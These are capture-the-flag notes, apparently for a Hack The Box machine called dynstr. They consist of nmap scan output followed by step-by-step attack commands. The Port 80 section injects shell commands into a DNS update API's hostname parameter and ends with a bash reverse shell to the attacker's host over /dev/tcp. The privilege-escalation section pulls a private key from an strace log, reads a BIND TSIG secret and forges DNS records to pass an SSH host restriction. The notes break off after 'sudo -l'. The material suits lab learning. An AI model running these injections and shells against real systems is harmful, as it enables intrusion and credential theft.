### Nmap
```text
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Dyna DNS
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)

```

### Port 80
```bash
# found api point
http://dyna.htb/nic/update

# api request
http://username:password@dynupdate.no-ip.com/nic/update?hostname=mytest.example.com&myip=192.0.2.25

# auth with default cred through no-ip api
curl "http://dynadns:sndanyd@no-ip.htb/nic/update?hostname=whatever.no-ip.htb&myip=10.10.14.16"
good 10.10.14.16

# inject code into request
curl -G --data-urlencode 'hostname=$(whoami).no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
good 10.10.14.16

# dig from server
dig +short www-data.no-ip.htb @10.10.10.244                                                                        
10.10.14.16

# run ping cmd (should encode dotted decimal to decimal)
curl -G --data-urlencode 'hostname=$(whoami;ping -c 1 168431120).no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
911 [nsupdate failed]

# get shell
curl -G --data-urlencode 'hostname=$(bash -c "bash -i >& /dev/tcp/168431120/443 0>&1").no-ip.htb' 'http://dynadns:sndanyd@10.10.10.244/nic/update'
```

### Priv Esc
```bash
# found ssh can be used to login through a specific domain
cat /home/bindmgr/.ssh/authorized_keys 
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen

# scriptreplay [.timing file] [.script file]
scriptreplay -t C62796521-debugging.timing -s C62796521-debugging.script

# obtain private key as the private key was logged by strace output
cat /home/bindmgr/support-case-C62796521/strace-C62796521.txt | grep BEGIN

# check bind key
ls -las /etc/bind

# check infra.key
cat infra.key 
key "infra-key" {
        algorithm hmac-sha256;
        secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
};

# update dns with key (include reverse lookup)
nsupdate -k /etc/bind/infra.key
> add evil.infra.dyna.htb 30 IN A 10.10.14.16
> send
> add 16.14.10.10.in-addr.arpa 30 IN PTR evil.infra.dyna.htb
> send
> 

# verify update
dig +short evil.infra.dyna.htb @10.10.10.244
10.10.14.16

# login bindmgr
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa bindmgr@$IP 

# check program that can be run as sudo without password
sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh

# ...
...

```
